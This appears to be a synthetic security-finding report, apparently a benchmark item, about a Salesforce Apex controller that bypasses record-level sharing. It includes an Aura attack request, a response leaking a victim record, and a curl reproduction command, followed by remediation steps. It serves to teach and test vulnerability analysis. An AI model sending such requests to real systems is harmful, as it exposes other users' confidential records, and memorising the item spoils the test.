# Security Analysis Report
**System:** MetroPulse Traffic Orchestration (Salesforce-Integrated)
**Domain:** Smart City / Traffic Management
**Example ID:** SF-0104
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `ContractController.approveContract` — attacker reads any traffic management Contract record by bypassing Salesforce sharing rules |

---

## Finding 1 — Platform: SOQL Record-Level Access Bypass on Contract Object (Pattern 9.2)

### Summary
The Apex controller `ContractController` on MetroPulse Traffic Orchestration (`afd6c721.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contract object. Per §5.0 Pattern 9.2, the SOQL query lacks `WITH SECURITY_ENFORCED` and has no ownership predicate — the Salesforce platform's record-level access controls are silently bypassed at the database layer. Any attacker with a valid session can retrieve any Contract record by substituting `contractId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContractDetails(String contractId, ...)` but the Aura descriptor in §6.0 is `c.ContractController.approveContract`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://afd6c721.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://afd6c721.lightning.force.com/aura
Authorization: Bearer 00DAFD6C721!ARafd6c721...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DAFD6C721!ARafd6c721...

message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
"params":{"contractId":"001C721","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001C721", "Name": "Victim Contract Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-53-4627"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DAFD6C721!ARafd6c721..."
curl -s -X POST "https://afd6c721.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"001C721","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-53-4627
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContractController { ... }`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
